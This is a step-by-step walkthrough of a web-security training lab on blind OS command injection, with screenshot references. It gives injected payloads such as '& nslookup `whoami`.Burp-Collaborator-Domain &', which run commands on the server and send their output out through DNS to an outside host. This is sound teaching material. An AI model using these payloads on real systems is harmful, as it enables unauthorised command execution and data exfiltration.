# Lab: Blind OS command injection with out-of-band data exfiltration

> Lab Objective: execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

- Submit a Feedback, then inspect the request.
  ![1st screenshot](./attachments/1.png)

- Inject this command `1& echo Ashour &` within any parameter, you will not notice any change in the response.
  ![2nd screenshot](./attachments/2.png)

- Therefore, try triggering an Out-of-Band DNS Lookup to a domain you control, using this command `& nslookup Burp-Collaborator-Domain &`.

- Inject this command within the email parameter
  ![3rd screenshot](./attachments/3.png)

- View Burp Collaborator tab you'll notice a DNS Lookup has been made.
  ![4th screenshot](./attachments/4.png)

- In order to check if you can exfiltrate data, try injecting this command `& nslookup ARBITRARY-VALUE.Burp-Collaborator-Domain &`
  ![5th screenshot](./attachments/5.png)

- You'll notice that the arbitrary value has been added to the DNS Lookup.
  ![6th screenshot](./attachments/6.png)

- Therefore, I can inject this command `& nslookup `whoami`.Burp-Collaborator-Domain &`, to retrieve the name of the current user via a DNS Lookup.
  ![7th screenshot](./attachments/7.png)

- The name of the current value has been added to Burp Collaborator Domain
  ![8th screenshot](./attachments/8.png)

- Submit the name of the current user, and the lab is solved.
  ![9th screenshot](./attachments/9.png)

---
